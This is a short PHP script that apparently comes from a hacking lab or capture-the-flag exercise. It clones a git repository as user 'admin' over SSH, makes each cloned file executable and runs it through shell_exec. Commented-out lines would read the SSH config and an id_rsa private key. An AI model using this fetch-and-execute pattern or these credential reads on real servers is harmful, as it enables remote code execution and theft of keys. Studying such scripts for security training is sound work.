<?php

$tmp = trim(shell_exec("mktemp -d"));
chdir($tmp);
//echo getcwd();

//echo shell_exec("cat /etc/ssh/ssh_config");

//echo shell_exec("cat /id_rsa");

shell_exec("git clone ssh://admin@git/home/admin/admin 2>&1");

foreach (glob("admin/*") as $filename) {
	echo $filename . "\n";
	shell_exec("chmod a+x $filename");
	echo shell_exec("$filename 2>&1");
}